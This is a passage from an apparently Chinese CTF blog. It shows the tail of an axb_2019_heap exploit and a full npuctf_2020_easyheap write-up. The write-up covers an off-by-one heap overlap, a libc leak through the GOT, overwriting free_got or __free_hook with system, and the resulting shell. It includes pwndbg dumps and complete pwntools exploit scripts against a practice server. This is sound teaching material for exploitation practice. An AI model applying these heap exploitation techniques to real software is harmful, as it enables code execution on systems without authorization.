class="line">pro_base = push_rbp - <span class="number">0x116a</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(pro_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">note = pro_base + <span class="number">0x0202060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">'cccc'</span>)</span><br><span class="line">print(hex(note))</span><br><span class="line"></span><br><span class="line">fd = note - <span class="number">0x18</span></span><br><span class="line">bk = note - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p8(<span class="number">0xa0</span>)</span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">print(hex(note))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0x98</span>)</span><br><span class="line">payload += p64(note + <span class="number">24</span>) +<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">print(hex(note))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>组合拳，题型：fmt + off by one + unlink</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/04/25/axb-2019-heap详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/25/npuctf-2020-easyheap详解/" >npuctf_2020_easyheap详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-25  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>off by one的题，，，</p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV19K4y1v7tq?from=search&seid=15178314990352817331" target="_blank" rel="noopener">off by one + 改got表的heap做法 例题：npuctf_2020_easyheap</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>create：</p>
<p>申请两个chunk： 一个heaparray[i]（固定0x10大小），一个是申请的大小（只能申请0x18或0x38）</p>
</li>
<li><p>edit：</p>
<p><code>read_input(heaparray[(signed int)v1][1], *heaparray[(signed int)v1] + 1LL);</code></p>
<p>存在off by one</p>
</li>
<li><p>show：根据idx，打印chunk大小和内容</p>
</li>
<li><p>delete：free后，将chunk指针置零了。</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用off by one，可以修改下一个chunk头指针的大小。</p>
<p>例如，一开始可以申请两个0x18的块。当修改chunk0，溢出到chunk1的头指针大小为0x41，那么chunk1free后重新申请回来，chunk1的内容会和chunk1头指针重叠，可以修改chunk1的指针。</p>
<p>溢出修改chunk1指针为free_got表，泄露地址，计算system</p>
<p>修改chunk内容从而，修改got表内容为system</p>
<p>在chunk0中放入“/bin/sh\x00”，则free(0)即可=&gt;system(“/bin/sh\x00”)</p>
<h4 id="1-查看保护"><a href="#1-查看保护" class="headerlink" title="1.查看保护"></a>1.查看保护</h4><blockquote>
<p>Partial RELRO =&gt; 可以修改got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec npuctf_2020_easyheap</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;npuctf_2020_easyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="2-申请两个0x18的块"><a href="#2-申请两个0x18的块" class="headerlink" title="2.申请两个0x18的块"></a>2.申请两个0x18的块</h4><blockquote>
<p>一共生成了四个chunk，两个heaparray，两个存在内容</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">#chunk0 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk0 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 heaparray</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1560290</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#chunk1 data</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x15602d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1560250</span><br><span class="line">0x1560250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560260:	0x0000000000000018	0x0000000001560280</span><br><span class="line">0x1560270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1560280:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1560290:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602a0:	0x0000000000000018	0x00000000015602c0</span><br><span class="line">0x15602b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x15602c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x15602d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x15602e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x15602f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-通过chunk0-off-by-one"><a href="#3-通过chunk0-off-by-one" class="headerlink" title="3.通过chunk0 off by one"></a>3.通过chunk0 off by one</h4><blockquote>
<p>修改chunk0的内容，首先放入接下来用的参数。</p>
<p>然后溢出一个字节，修改chunk1 heaparray的大小为0x41</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1327290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x13272d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1327250</span><br><span class="line">0x1327250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327260:	0x0000000000000018	0x0000000001327280</span><br><span class="line">0x1327270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1327280:	0x0068732f6e69622f	0x0000000000000000	#&quot;&#x2F;bin&#x2F;sh\x00&quot;</span><br><span class="line">0x1327290:	0x0000000000000000	0x0000000000000041	#溢出一个字节</span><br><span class="line">0x13272a0:	0x0000000000000018	0x00000000013272c0</span><br><span class="line">0x13272b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x13272c0:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x13272d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x13272e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13272f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>存放所有的heaparay指针，有两个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x0000000000bf0260	0x0000000000bf02c0</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="4-释放chunk1"><a href="#4-释放chunk1" class="headerlink" title="4.释放chunk1"></a>4.释放chunk1</h4><blockquote>
<p>chunk1通过上面的全局变量，找到的地址还是不变，但是大小以及被修改为0x41，会按照0x41的大小被释放</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (tcache) | PREV_INUSE</span><br><span class="line">Addr: 0x21d9290</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x21d92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x21d9250</span><br><span class="line">0x21d9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9260:	0x0000000000000018	0x00000000021d9280</span><br><span class="line">0x21d9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0x21d9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x21d92a0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92b0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x21d92c0:	0x0000000000000000	0x00000000021d9010	#释放</span><br><span class="line">0x21d92d0:	0x0000000000000000	0x0000000000020d31</span><br><span class="line">0x21d92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x21d92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0</span><br><span class="line">0x6020a0 &lt;heaparray&gt;:	0x00000000021d9260	0x0000000000000000		#另一个被清零了</span><br><span class="line">0x6020b0 &lt;heaparray+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0 &lt;heaparray+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0 &lt;heaparray+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;heaparray+64&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="5-重新申请0x38的块"><a href="#5-重新申请0x38的块" class="headerlink" title="5.重新申请0x38的块"></a>5.重新申请0x38的块</h4><blockquote>
<p>再次申请，会把之前释放的0x41和0x21重新申请回来。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf0290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">#找不到下一个，，，但是在</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbf02d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>

<h4 id="6-通过0x41的块，溢出覆盖0x21的块"><a href="#6-通过0x41的块，溢出覆盖0x21的块" class="headerlink" title="6.通过0x41的块，溢出覆盖0x21的块"></a>6.通过0x41的块，溢出覆盖0x21的块</h4><blockquote>
<p>但是由于0x41的chunk与0x21的chunk重叠了，故可以通过0x41的chunk修改0x21的chunk</p>
<p>但是0x21的chunk存放的是chunk1的指针，故可以让chunk1指针指向free got表，达到泄露。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbf0250</span><br><span class="line">0xbf0250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0260:	0x0000000000000018	0x0000000000bf0280</span><br><span class="line">0xbf0270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbf0280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbf0290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbf02a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbf02c0:	0x0000000000000038	0x0000000000602018#free_got</span><br><span class="line">0xbf02d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbf02e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbf02f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x15d bytes:</span><br><span class="line">    00000000  53 69 7a 65  20 3a 20 35  36 0a 43 6f  6e 74 65 6e  │Size│ : 5│6·Co│nten│</span><br><span class="line">    00000010  74 20 3a 20  30 ba fd 89  0a 7f 0a 44  6f 6e 65 21  │t : │0···│···D│one!│</span><br><span class="line">    #泄露到了free的地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr &#x3D; u64(p.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)</span><br></pre></td></tr></table></figure>

<h4 id="7-修改free-got表为system地址"><a href="#7-修改free-got表为system地址" class="headerlink" title="7.修改free_got表为system地址"></a>7.修改free_got表为system地址</h4><blockquote>
<p>此时chunk1的指针指向free_got，故修改chunk1的内容，就可以修改free_got表内容，修改为system地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9000</span><br><span class="line">Size: 0x251</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9270</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb9290</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xbb92d0</span><br><span class="line">Size: 0x20d31</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xbb9250</span><br><span class="line">0xbb9250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9260:	0x0000000000000018	0x0000000000bb9280</span><br><span class="line">0xbb9270:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xbb9280:	0x0068732f6e69622f	0x0000000000000000</span><br><span class="line">0xbb9290:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xbb92a0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92b0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xbb92c0:	0x0000000000000038	0x0000000000602018#chunk1指针-&gt;free_got-&gt;system</span><br><span class="line">0xbb92d0:	0x000000000000000a	0x0000000000020d31</span><br><span class="line">0xbb92e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xbb92f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018:	0x00007fcb5dae9550	0x000000000040060a</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fcb5dae9550</span><br><span class="line">0x7fcb5dae9550 &lt;__libc_system&gt;:	0xfa66e90b74ff8548	0x0000441f0f66ffff</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process("./npuctf_2020_easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29535</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./npuctf_2020_easyheap"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("./libc-2.27.so")</span></span><br><span class="line"><span class="comment"># p = process(['./npuctf_2020_easyheap'],env=&#123;"LD_PRELOAD":"./libc-2.27.so"&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"only) :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"aaaa"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x38</span>) + p64(free_got)</span><br><span class="line">create(<span class="number">0x38</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><p>特点：</p>
<ol>
<li>可以修改got表</li>
<li>malloc两次：一个node，一个content</li>
</ol>
<p>方法：</p>
<ol>
<li>利用node和本体互换 =&gt; 泄露libc</li>
<li>修改free_got=&gt;system</li>
</ol>
<blockquote>
<p>off by one题挺多，多练习，this is the first。</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/04/25/npuctf-2020-easyheap详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/24/hitcontraining-bamboobox/" >hitcontraining_bamboobox</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-24  </div>
		</div>
	</div>
	


			<div class="entry">
